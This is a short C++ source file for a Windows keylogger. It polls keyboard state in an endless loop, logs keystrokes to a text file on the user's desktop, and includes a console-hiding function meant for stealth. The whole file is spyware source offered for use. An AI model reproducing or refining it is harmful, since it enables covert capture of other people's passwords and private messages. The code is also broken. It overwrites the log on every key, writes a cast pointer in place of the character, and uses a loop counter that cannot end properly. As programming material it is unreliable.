#define PATH "C:\\Users\\Tal\\Desktop\\KeyLogger_OUTFILE.txt"  // path to log folder location
#include <iostream>
#include <Windows.h>
#include <time.h>
#include <fstream>
void hideConsole();
void showConsole();
void saveToFile(int key_ascii);

int main()
{
	showConsole();
	while (true)
	{
		Sleep(20); 
		for (char i = 8; i <= 255; i++)
			if (GetAsyncKeyState(i) == -32767) // catch keystrokes
				saveToFile(i);
	}
}

void saveToFile(int key_ascii)
{
	Sleep(20);
	std::ofstream OUTPUT_FILE;
	OUTPUT_FILE.open(PATH);
	if (OUTPUT_FILE.fail())
	{
		showConsole();
		std::cout << "Error: cannot open file " << PATH;
	}
		
	else if (key_ascii == VK_ESCAPE)
		exit(1);
	else if (key_ascii == VK_SHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_ascii == VK_RETURN)
		OUTPUT_FILE << "[ENTER]";
	else if (key_ascii == VK_SPACE)
		OUTPUT_FILE << "[SPACE]";
	else if (key_ascii == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_ascii == VK_DELETE)
		OUTPUT_FILE << "[DELETE]";
	else if (key_ascii == VK_BACK)
		OUTPUT_FILE << "[BACKSPACE]";
	else if (key_ascii == VK_SHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else
		OUTPUT_FILE << (char)&key_ascii;
	OUTPUT_FILE.close();
}

void hideConsole()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void showConsole()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}